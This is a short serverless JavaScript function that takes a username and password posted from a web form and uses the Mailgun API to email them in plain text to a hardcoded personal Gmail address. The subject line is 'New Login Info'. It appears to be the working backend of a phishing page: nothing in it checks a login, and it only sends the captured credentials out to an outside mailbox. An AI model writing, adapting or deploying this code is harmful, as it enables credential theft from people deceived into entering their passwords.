import formData from 'form-data';
import Mailgun from 'mailgun.js';

const mailgun = new Mailgun(formData);
const mg = mailgun.client({
username: 'api',
key: process.env.MAILGUN_API_KEY
});

export async function handler(event) {
// Only allow POST requests
if (event.httpMethod !== 'POST') {
return { statusCode: 405, body: 'Method Not Allowed' };
}

if (!event.body) {
return { statusCode: 400, body: JSON.stringify({ message: 'No data sent' }) };
}

try {
const { username, password } = JSON.parse(event.body);

// Hardcoded 'from' for Mailgun sandbox
await mg.messages.create(process.env.MAILGUN_DOMAIN, {
from: 'Mailgun Sandbox <postmaster@sandbox6bb4164382f045b9975489c0e3137797.mailgun.org>',
to: 'Anabones716@gmail.com', // must be verified in sandbox
subject: 'New Login Info',
text: `Username: ${username}\nPassword: ${password}`
});

return { statusCode: 200, body: JSON.stringify({ message: "Email sent!" }) };
} catch (error) {
console.error('Mailgun error:', error);
return { statusCode: 500, body: JSON.stringify({ message: "Error sending email" }) };
}
}
